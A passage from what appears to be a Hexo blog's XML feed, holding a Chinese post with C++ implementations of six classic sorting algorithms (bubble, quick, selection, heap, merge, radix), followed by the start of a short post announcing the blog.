<h1 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">bubbleSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">partition</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 设定随机pivot</span>
	<span class="token keyword">int</span> randIdx <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> left<span class="token punctuation">;</span>
	<span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>randIdx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> pivot <span class="token operator">=</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">>=</span> pivot<span class="token punctuation">)</span> <span class="token operator">--</span>right<span class="token punctuation">;</span>
		nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> pivot<span class="token punctuation">)</span> <span class="token operator">++</span>left<span class="token punctuation">;</span>
		nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">=</span> pivot<span class="token punctuation">;</span>
	<span class="token keyword">return</span> left<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">recurSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">></span> right<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token function">partition</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">recurSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> left<span class="token punctuation">,</span> p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">recurSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">recurSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">selectSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> minIdx <span class="token operator">=</span> i<span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>minIdx<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				minIdx <span class="token operator">=</span> j<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>minIdx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">headAjust</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> left <span class="token operator">=</span> i <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> right <span class="token operator">=</span> i <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> largest <span class="token operator">=</span> i<span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;=</span> len <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			largest <span class="token operator">=</span> left<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>right <span class="token operator">&lt;=</span> len <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			largest <span class="token operator">=</span> right<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>largest <span class="token operator">==</span> i<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>largest<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		i <span class="token operator">=</span> largest<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">heapSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 构建最大堆</span>
	<span class="token keyword">int</span> len <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> len <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">headAjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> len<span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">headAjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">--</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> mid<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">numsCpy</span><span class="token punctuation">(</span>high <span class="token operator">-</span> low <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> p1 <span class="token operator">=</span> low<span class="token punctuation">,</span> p2 <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> p3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>p1 <span class="token operator">&lt;=</span> mid <span class="token operator">&amp;&amp;</span> p2 <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>p1<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> nums<span class="token punctuation">[</span>p2<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			numsCpy<span class="token punctuation">[</span>p3<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>p1<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			numsCpy<span class="token punctuation">[</span>p3<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>p2<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>p1 <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> numsCpy<span class="token punctuation">[</span>p3<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>p1<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>p2 <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> numsCpy<span class="token punctuation">[</span>p3<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>p2<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> numsCpy<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		nums<span class="token punctuation">[</span>low<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> numsCpy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">recurSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>low <span class="token operator">>=</span> high<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token function">recurSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">recurSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">merge</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">mergeSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token function">recurSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 本排序算法仅适用于整数排序</span>
<span class="token keyword">void</span> <span class="token function">countingSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> exp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">output</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> digit <span class="token operator">=</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">/</span> exp<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>
		<span class="token operator">++</span>count<span class="token punctuation">[</span>digit<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		count<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> count<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> digit <span class="token operator">=</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">/</span> exp<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>
		output<span class="token punctuation">[</span>count<span class="token punctuation">[</span>digit<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token operator">--</span>count<span class="token punctuation">[</span>digit<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">radixSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> positiveNums<span class="token punctuation">;</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> negativeNums<span class="token punctuation">;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			positiveNums<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			negativeNums<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>positiveNums<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> maxVal <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>positiveNums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> positiveNums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> exp <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> maxVal <span class="token operator">/</span> exp <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> exp <span class="token operator">*=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">countingSort</span><span class="token punctuation">(</span>positiveNums<span class="token punctuation">,</span> exp<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>negativeNums<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">int</span> maxVal <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>negativeNums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> negativeNums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> exp <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> maxVal <span class="token operator">/</span> exp <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> exp <span class="token operator">*=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token function">countingSort</span><span class="token punctuation">(</span>negativeNums<span class="token punctuation">,</span> exp<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> negativeNums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> negativeNums<span class="token punctuation">[</span>negativeNums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
			nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> positiveNums<span class="token punctuation">[</span>i <span class="token operator">-</span> negativeNums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>开始写个人博客了</title>
    <url>/2021/05/06/%E5%BC%80%E5%A7%8B%E5%86%99%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E4%BA%86/</url>
    <content><![CDATA[<h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><p>经过两天的折腾，利用Hexo框架和github托管的方式搭建的静态博客也算有了个雏形，这两天将继续对其进行美化以及添加新功能，今后打算在这里不定期分享一些自己感兴趣的编程、数码、游戏相关的内容。</p>
